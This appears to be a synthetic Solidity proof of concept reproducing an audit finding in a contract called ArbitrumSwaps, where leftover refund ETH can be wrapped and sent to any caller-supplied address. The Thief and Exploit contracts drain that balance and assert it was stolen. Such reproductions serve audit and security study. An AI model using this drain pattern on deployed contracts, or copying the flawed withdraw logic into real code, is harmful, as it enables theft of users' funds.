// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Mugen ArbitrumSwaps — native balance is spendable by anyone (Pashov H-01, #20422).
    SYNTHETIC, cheatcode-free. stargateSwap passes address(this) as the Stargate
    refund address, so leftover native gas sits on ArbitrumSwaps. arbitrumSwaps
    with steps WETH_DEPOSIT and WETH_WITHDRAW wraps that balance and sends it
    to a caller-supplied address. */

contract WETH {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw(uint256 wad) external {
        require(balanceOf[msg.sender] >= wad, "weth");
        balanceOf[msg.sender] -= wad;
        (bool ok,) = msg.sender.call{value: wad}("");
        require(ok, "unwrap");
    }

    receive() external payable {}
}

contract MockStargateRouter {
    function swap(address payable refundAddress) external payable {
        uint256 bridged = 1 ether;
        require(msg.value > bridged, "fee");
        uint256 refund = msg.value - bridged;
        (bool ok,) = refundAddress.call{value: refund}("");
        require(ok, "refund");
    }
}

contract ArbitrumSwaps {
    uint8 public constant WETH_DEPOSIT = 1;
    uint8 public constant WETH_WITHDRAW = 2;
    WETH public weth;
    MockStargateRouter public router;

    constructor(WETH weth_, MockStargateRouter router_) {
        weth = weth_;
        router = router_;
    }

    function stargateSwap() external payable virtual {
        router.swap{value: msg.value}(payable(address(this)));
    }

    function arbitrumSwaps(uint8[] calldata steps, bytes[] calldata data) external payable {
        for (uint256 i; i < steps.length; ++i) {
            if (steps[i] == WETH_DEPOSIT) {
                weth.deposit{value: address(this).balance}();
            } else if (steps[i] == WETH_WITHDRAW) {
                address to = abi.decode(data[i], (address));
                uint256 bal = weth.balanceOf(address(this));
                // @> VULN: unwraps the whole contract WETH balance to a caller-supplied address
                weth.withdraw(bal);
                (bool ok,) = to.call{value: address(this).balance}("");
                require(ok, "send");
            }
        }
    }

    receive() external payable {}
}

contract Thief {
    ArbitrumSwaps public swaps;

    constructor(ArbitrumSwaps swaps_) {
        swaps = swaps_;
    }

    function steal() external {
        uint8[] memory steps = new uint8[](2);
        steps[0] = swaps.WETH_DEPOSIT();
        steps[1] = swaps.WETH_WITHDRAW();
        bytes[] memory data = new bytes[](2);
        data[1] = abi.encode(address(this));
        swaps.arbitrumSwaps(steps, data);
    }

    receive() external payable {}
}

contract Exploit {
    WETH public weth;
    MockStargateRouter public router;
    ArbitrumSwaps public swaps;
    Thief public thief;

    constructor() {
        weth = new WETH();
        router = new MockStargateRouter();
        swaps = new ArbitrumSwaps(weth, router);
        thief = new Thief(swaps);
    }

    function run() external payable {
        require(msg.value == 3 ether, "fund");
        swaps.stargateSwap{value: 3 ether}();
        require(address(swaps).balance == 2 ether, "refund parked");
        require(address(router).balance == 1 ether, "bridged");
        thief.steal();
        require(address(thief).balance == 2 ether, "stolen");
        require(address(swaps).balance == 0, "swept");
    }
}
